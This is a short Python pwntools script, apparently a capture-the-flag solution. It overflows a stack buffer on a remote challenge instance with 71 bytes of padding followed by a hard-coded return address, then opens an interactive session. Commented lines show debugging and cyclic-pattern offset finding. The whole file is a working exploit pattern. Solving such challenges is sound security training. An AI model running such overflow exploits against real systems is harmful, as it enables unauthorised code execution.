from pwn import *
import string


context.log_level = 'info'
context.arch = 'amd64'
context.os = 'linux'

gdb_script = f"""
 xuntil vuln
 """
# p = gdb.debug("./app", gdbscript=gdb_script)
# p = process("./app")
p = remote("inst-a066v7xfd2.tls.vuln.si", 443, ssl=True)
# name = cyclic(63, alphabet=string.ascii_lowercase)
# surname = cyclic(63, alphabet=string.ascii_uppercase)
# name = 'A'*64
# surname = 'B'*64
# p.sendline(name)
payload = 0x004011c6
# retgadg = 0x000000000040101a

p.send(71*'A')
# p.send()
p.sendline(p64(payload))

p.interactive()
